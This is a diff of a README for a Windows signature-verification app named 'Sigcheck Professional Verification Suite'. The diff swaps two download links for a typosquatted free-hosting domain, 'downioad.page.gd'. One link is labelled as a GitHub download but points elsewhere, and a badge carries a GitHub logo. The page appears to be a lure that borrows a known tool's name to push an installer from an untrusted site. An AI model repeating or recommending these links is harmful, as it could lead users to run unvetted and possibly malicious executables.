@@ -2,7 +2,7 @@
 
 Sigcheck Professional Verification Suite is a comprehensive Windows desktop application designed for verifying digital file signatures and ensuring system integrity. This powerful tool allows users to quickly authenticate executable files, drivers, and system components on Windows 10 and Windows 11 by checking their cryptographic signatures against trusted certificate authorities.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -60,7 +60,7 @@ No. All signature verification is performed locally using your system's certific
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
